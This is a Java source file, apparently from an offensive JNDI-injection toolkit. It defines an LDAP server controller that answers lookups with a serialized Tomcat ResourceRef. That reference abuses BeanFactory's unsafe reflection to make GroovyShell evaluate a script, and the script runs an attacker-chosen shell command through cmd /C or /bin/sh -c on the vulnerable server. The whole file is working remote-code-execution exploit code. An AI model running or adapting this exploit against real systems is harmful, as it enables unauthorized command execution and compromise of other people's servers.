package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.PayloadType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import org.fusesource.jansi.Ansi;

import javax.naming.StringRefAddr;

import static org.fusesource.jansi.Ansi.ansi;

/*
 * Requires:
 *   - Tomcat and Groovy in classpath
 *
 * @author https://twitter.com/orange_8361 and https://github.com/welk1n
 *
 * Groovy 语法参考：
 *      - https://xz.aliyun.com/t/8231#toc-7
 *      - https://my.oschina.net/jjyuangu/blog/1815945
 *      - https://stackoverflow.com/questions/4689240/detecting-the-platform-window-or-linux-by-groovy-grails
 */

@LdapMapping(uri = {"/groovy"})
public class GroovyController implements LdapController {
    private PayloadType type;
    private String[]    params;
    private String      template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
            "       ['cmd','/C', '${cmd}'].execute();\n" +
            "   } else {\n" +
            "       ['/bin/sh','-c', '${cmd}'].execute();\n" +
            "   }";

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", template.replace("${cmd}", params[0]).replace("${cmd}", params[0])));

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI LDAP Local Refenrence Links + Groovy");
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            String payloadType = base.substring(firstIndex + 1, secondIndex);
            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
            if (payloadType.equalsIgnoreCase("command")) {
                type = PayloadType.valueOf("command");
                //System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
            } else {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
            }

            String cmd = Util.getCmdFromBase(base);
            System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
            params = new String[]{cmd};
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}